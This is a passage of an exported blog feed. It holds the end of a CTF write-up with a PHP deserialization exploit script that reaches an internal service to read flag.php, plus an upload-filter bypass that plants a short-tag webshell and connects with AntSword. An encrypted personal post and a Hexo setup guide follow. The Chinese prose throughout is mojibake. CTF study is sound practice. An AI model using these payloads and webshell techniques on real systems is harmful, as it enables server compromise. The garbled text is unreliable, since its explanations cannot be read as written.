&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨goodmanå‡½æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œè®©aä¸ºFileViewerç±»çš„å¯¹è±¡<code>b=&quot;local&quot;</code>ï¼Œç„¶åè®©Backdoorç±»ä¸‹<br><code>superhacker=&quot;http://127.0.0.1:65500/&quot;</code>å°±å¯ä»¥è¦†ç›–æˆåŠŸï¼Œaä¸ºFileViewerå¯¹è±¡ä½†è¿™ä¸ªç±»é‡Œé¢æ²¡æœ‰cæ–¹æ³•ï¼Œè¿›å…¥<code>__call</code>é­”æœ¯æ–¹æ³•ï¼Œ è¿™æ ·popé“¾æ„é€ å®Œæˆï¼Œä½†æ˜¯è¿™é‡Œæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ<br><img src="https://s1.ax1x.com/2022/11/08/xzuqMD.png" alt="xzuqMD.png"><br>ç›´æ¥ä¼ ç»™image_pathæ˜¯å¤±è´¥äº†çš„<br><img src="https://s1.ax1x.com/2022/11/08/xzu5I1.png" alt="xzu5I1.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuoPx.png" alt="xzuoPx.png"></p><p>è¿™ç¯‡åšå®¢æ‰“å¼€æ˜¯ç©ºçš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¾—ä»è¿™é‡Œè¿›å…¥localfileï¼ŒåŸæ¥çš„é‚£æ¡é“¾å­å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œæˆ‘çš„ç†è§£æ˜¯è¿™æ ·çš„ï¼Œwpä¸­è¿™é‡Œæ²¡æœ‰å¤ªå¤šè§£é‡Š<br>expï¼šæ¥æºwp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$black_list</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$local</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line"><span class="variable">$n</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"><span class="variable">$n</span>-&gt;a=<span class="variable">$m</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;b=<span class="string">&quot;local&quot;</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;superhacker=<span class="string">&quot;127.0.0.1:65500/&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;black_list=<span class="string">&quot;é»‘åå•ä»€ä¹ˆçš„ç®¡ä¸ç€æˆ‘&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;local=<span class="variable">$n</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;path=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰æ²¡å¤ªç†è§£æœ‰ç‚¹é—®é¢˜ï¼Œå…ˆè¿™æ ·å§<br>path_infoè¿›å…¥<br><img src="https://s1.ax1x.com/2022/11/08/xzu4aR.png" alt="xzu4aR.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuWqJ.png" alt="xzuWqJ.png"><br>è§£ç å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2022/11/08/xzuhZ9.png" alt="xzuhZ9.png"></p><h2 id="file-master"><a href="#file-master" class="headerlink" title="file_master"></a>file_master</h2><p>è¿›æ¥æœ‰ä¸ªæŸ¥çœ‹æ–‡ä»¶ï¼Œè¯•ä¸€ä¸‹index.php<br><img src="https://s1.ax1x.com/2022/11/08/xzKHkn.png" alt="xzKHkn.png"><br>æŸ¥çœ‹æºç <br><img src="https://s1.ax1x.com/2022/11/08/xzKbYq.png" alt="xzKbYq.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$whtie_list</span> = <span class="keyword">array</span>(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$filetype</span>,<span class="variable">$whtie_list</span>))&#123;</span><br><span class="line">            <span class="variable">$img_info</span> = @<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$img_info</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$save_path</span> = <span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>().<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload success!! upload/your_sessionid/your_filename&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;image hight and width must less than 20&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;invalid file head&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;invalid file type!image/jpeg only!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;welcome.jpg&quot;</span>)).<span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¼ ä¸€å¼ å›¾ç‰‡é©¬æ˜¾ç¤ºå¤ªå¤§äº†<br><img src="https://s1.ax1x.com/2022/11/08/xzKqf0.png" alt="xzKqf0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨defineæ”¹ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°è¿™ä¸­æ“ä½œï¼Œé¢˜åˆ·çš„å¤ªå°‘äº†<br><img src="https://s1.ax1x.com/2022/11/08/xzKowj.png" alt="xzKowj.png"><br>è¢«æ‹¦äº†ï¼Œè€Œä¸”æœ‰å»¶æ—¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                       <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                       @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¯•ä¸€ä¸‹çŸ­æ ‡ç­¾<br><img src="https://s1.ax1x.com/2022/11/08/xzKImQ.png" alt="xzKImQ.png"><br>ä¸Šä¼ æˆåŠŸï¼ŒPHPè¯•ä¸€ä¸‹<br><img src="https://s1.ax1x.com/2022/11/08/xzK4Og.png" alt="xzK4Og.png"><br>æˆåŠŸï¼Œè·¯å¾„ç›´æ¥æç¤ºäº†æ ¼å¼ï¼Œè¿èšå‰‘<br><img src="https://s1.ax1x.com/2022/11/08/xzKh6S.png" alt="xzKh6S.png"><br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿ä¸ä¸Šï¼Œè¿›å…¥æ–‡ä»¶å‘ç°æŠ¥é”™<br><a href="https://imgse.com/i/xzKfl8"><img src="https://s1.ax1x.com/2022/11/08/xzKfl8.png" alt="xzKfl8.png"></a><br>å¤šäº†ä¸€ä¸ª<code>&gt;</code>åˆ æ‰è¿æ¥æˆåŠŸï¼Œæ–‡ä»¶æ‰“ä¸å¼€ç›´æ¥è¿›ç»ˆç«¯<br><img src="https://s1.ax1x.com/2022/11/08/xzKTTs.png" alt="xzKTTs.png"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å‚è€ƒï¼š</p><p>(<a href="https://www.wd-ljt.com/post/1024/894.html">https://www.wd-ljt.com/post/1024/894.html</a>)       </p><p>è¿™ç¯‡å¤ç°é¸½äº†è¿™ä¹ˆä¹…ç»ˆäºå¼„å®Œäº†ï¼Œè¿™ç¯‡åšå®¢å›¾ç‰‡ä¸Šä¼ çš„çœŸä¸å®¹æ˜“å•Šï¼Œobsidainå¯¹å›¾ç‰‡çš„å¤„ç†çœŸçš„éº»çƒ¦ï¼Œå¾—æ‰¾ä¸ªæ’ä»¶è§£å†³ä¸€ä¸‹è¿™ä¸ªé—®é¢˜ï¼Œä¸ç„¶ä¸‹æ¬¡è¿˜å¾—ä¸€ä¸ªä¸ªé‡æ–°æˆªå›¾ä¿å­˜ä¸Šä¼ ï¼Œåšå®¢è¿˜ä¸å¤Ÿå®Œå–„ï¼Œå¯¼èˆªéƒ½è¿˜æ²¡å¼„ï¼Œæ‰¾ä¸ªæ—¶é—´å¼„å¼„å§</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æˆé•¿</title>
      <link href="/undefined/3364.html"/>
      <url>/undefined/3364.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰ï¼Œè¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹ï¼Œè¯·å†è¯•è¯•" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="789c51522296cf26c972e79e6dc64ee9b6f0a43cd707535122b61ec2e35979fd">b36be19ce9e1144d75d9dbaaee27fc91995ed66158f8b54f5086b3e2378b74871ea22cbd1e9675f297060a77448419f3000a7b11b30cfd73b39b6d6af69ddc4014cdcce4d33ee1ef898181285f286808e510515f56330e0702faeea6327b5b88a9b81da581f846855cc9df428c604138a63543d0cef2dec18f1936d4eae96cf8c85978b5f4dc1a0ce68193c26a401eb7c5a184b529699c0449c558c2acff0a3c0595c1927c66e565821fcb0a150d47d9495f34955c93253db23651e76a41c7bc0ff113b4ab142b0b37c5506af4d9e9b6b2597bd8adffcc77b5c57b4ee7b97f0b4ee8ec6b9198bcbada4b0a1b78152885381166f086c04a5c9b21d38f96a1c043820f068b4892d9cb029bbb02c83e59d22d54e6f7229d70113155b8b4c3ce4d3dc06e09d755ecf51ef628adaced631b218115af61805f60730358ab78b44979caed01e6d135296e426293b34b13741ca1fce62fd1225c1b6e917690ab2e80e9a2e2e4a18ab1be6c01024b9b3c57e6f2a2e53800a9d8e79bfc808b3971f4ecb0846b9e2fb11f90ab2109132bc2c9851d0f4446997e1408f75873a3dd2703ad997f089529336e134c5bfebd9da8143e6537e1113619a222d0e0fc6490ac28ef32daedcd9dfc497f023bd6eef02c9c0b44549c25cd00d533caf956e070ad44905f9d16ab82d633eb9feccce01b7d5a21a6ae250588409679acd45731495c58e6a1699124b54ef3fe818ec8f7d1d9292388c763fbe8541328ebc6aea592ae63b2478a4fa6581900dccbb8ea8a3029a603bf80fe998ee28ec58dd6d0ee6e1b9ec4cba40a765e7e9e1b44c469c3820fc5e6d6433e953d549d601d183cd547727559b60ad1869cea995af6b1ef7ab62b71994221abf8fe5ad9646169c1e6c0b8915e596be852a8d713d8787b8c2d92db7c9f271f6b50ad729c329ace5d0e023e487fa1282ada1c09d107ff2741590d5affae597b36d6148646d459217a4d621abcf8ede2dc71c1da0db4fda4ffcd6a8ade1b9c7ca94819f39accd3750c8741a330aef29ca8970ea929c1567d022fdf3ab0c7bb060da082b1010797997b8fd1d600f22172e72a909d60891c2b8c633c50013bc36de6a61e52669a2433d7788c6584ac79b91315ed03cd60e8f0a1b311f7795060145fe6eb51e29efefadaa86b8bde6a8a7c343724b9a8812c56ee4f8e09e6a0f3ddf6f450195b584dc50823defa435676925d01251e4d9377aec180f15804d3ae01b7282e3d781c880f7d6a098fa3b24cd716b80fbd5bcbe8417cb69a805004338be92579efd80abbfe6aef5262c220d8d98a564ad7a771a201c818d9051dbebcc83959401389e26a000315de8f1fb46e2fa758094d7b56fe8fa961aba395bad849c47a9117259916da5934f2e83b259ae8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">ç•™ç‚¹å°ç§˜å¯†</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ä¸ªäºº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åšå®¢æ­å»º</title>
      <link href="/undefined/26832.html"/>
      <url>/undefined/26832.html</url>
      
        <content type="html"><![CDATA[<h3>hexo+GitHubæ­å»º</h3><p>åŸºæœ¬æ­¥éª¤ç›´æ¥çœ‹è§†é¢‘<a href="https://www.bilibili.com/video/BV1mU4y1j72n?p=5&spm_id_from=pageDriver&vd_source=fdbccecc8d1a39a2449860e47c52b6e7">åœ°å€</a></p><p>å»ºè®®æ”¾åšå®¢çš„æ–‡ä»¶å¤¹ä¸è¦æ”¾ä¸­æ–‡ï¼Œæˆ‘åœ¨æ‰§è¡Œ<code>hexo init</code>æ—¶ä¸€ç›´æŠ¥é”™ï¼Œä½†æ˜¯æŠŠä¸­æ–‡åå»æ‰ä¹‹åå°±å¥½äº†</p><h3>ä¸»é¢˜è®¾ç½®</h3>æ‰“å¼€ä½ åˆ›å»ºçš„æ”¾åšå®¢å†…å®¹çš„æ–‡ä»¶å¤¹<p><img src="https://s1.ax1x.com/2022/10/05/xl26rF.md.png" alt="xl26rF.md.png"></p><p>æ‰“å¼€_config.ymlæ–‡ä»¶ï¼Œæˆ‘è¿™é‡Œç”¨vscodeæ‰“å¼€çš„</p><p><img src="https://s1.ax1x.com/2022/10/05/xlRZR0.png" alt="xlRZR0.png"></p><p>å°†themeåé¢çš„ä¸œè¥¿æ”¹ä¸ºä½ çš„ä¸»é¢˜åï¼Œä½ ä¸‹è½½å¥½çš„ä¸»é¢˜ååœ¨themesä¸­èƒ½çœ‹åˆ°ï¼Œè‡³äºæ€ä¹ˆä¸‹è½½å¯ä»¥åœ¨[å®˜ç½‘](<a href="https://hexo.io/themes/">Themes | Hexo</a>)é€‰ä¸€ä¸ªå–œæ¬¢çš„ä½¿ç”¨å‘½ä»¤ä¸‹è½½ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨GitHubå°†æ–‡ä»¶ä¸‹è½½ç„¶åè§£å‹åˆ°themesæ–‡ä»¶é‡Œ</p><p><strong>æ‰§è¡Œhexoä¸‰è¿</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl //æ¸…é™¤ç¼“å­˜</span><br><span class="line">hexo g  //ç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œä¸ªäººç†è§£å°†mdè½¬ä¸ºhtml</span><br><span class="line">hexo s  //æœ¬åœ°é¢„è§ˆ</span><br></pre></td></tr></table></figure><p>æ»¡æ„ä¹‹åä¸Šçº¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><h3 id="ä¸»é¢˜çš„ä¸ªæ€§åŒ–"><a href="#ä¸»é¢˜çš„ä¸ªæ€§åŒ–" class="headerlink" title="ä¸»é¢˜çš„ä¸ªæ€§åŒ–"></a>ä¸»é¢˜çš„ä¸ªæ€§åŒ–</h3><p>è¿™ä¸€æ­¥æˆ‘æƒ³æ¢æˆ‘è‡ªå·±å–œæ¬¢çš„å›¾ç‰‡ï¼Œæ¨ªå¹…èƒŒæ™¯ï¼Œå¯¼èˆªæ logoï¼Œä½†æ˜¯ä¸€ç›´å¤±è´¥æŒ‰ç…§å®˜æ–¹æ–‡æ¡£é…ç½®ä¹Ÿä¸è¡Œï¼Œåªèƒ½ç”¨é»˜è®¤ï¼Œç­‰ä»¥åç ”ç©¶æ˜ç™½äº†å†å¼„ã€‚</p><h3 id="å›¾åºŠçš„ä½¿ç”¨"><a href="#å›¾åºŠçš„ä½¿ç”¨" class="headerlink" title="å›¾åºŠçš„ä½¿ç”¨"></a>å›¾åºŠçš„ä½¿ç”¨</h3><p>æˆ‘ç”¨çš„æ˜¯[è·¯è¿‡å›¾åºŠ](<a href="https://imgse.com/">è·¯è¿‡å›¾åºŠ - å…è´¹å›¾ç‰‡ä¸Šä¼ , ä¸“ä¸šå›¾ç‰‡å¤–é“¾, å…è´¹å…¬å…±å›¾åºŠ (imgse.com)</a>)çœ‹ç½‘ä¸Šçš„æ•™ç¨‹ä½¿ç”¨æ’ä»¶æ²¡æˆåŠŸï¼ŒPicgoè£…å¥½äº†å¯åŠ¨ä¸äº†å°±å¾ˆæ‡µ</p><p>ä½¿ç”¨ï¼šç›´æ¥æŠŠå›¾ç‰‡ä¸Šä¼ åˆ°å›¾åºŠä¸Šé¢ï¼Œç„¶åå¤åˆ¶ä¸‹é¢è¿™é‡Œçš„è¿æ¥å°±è¡Œ</p><p><img src="https://s1.ax1x.com/2022/10/05/xlWxu8.png" alt="xlWxu8.png"></p><p>æ€»ç»“</p><p>å¾ˆå¤šç»†èŠ‚è¿˜æ˜¯æœ‰é—®é¢˜ï¼Œå¯èƒ½æ˜¯æˆ‘ä½¿ç”¨çš„ä¸»é¢˜æœ‰é—®é¢˜ä»¥åæ…¢æ…¢å†å¼„</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
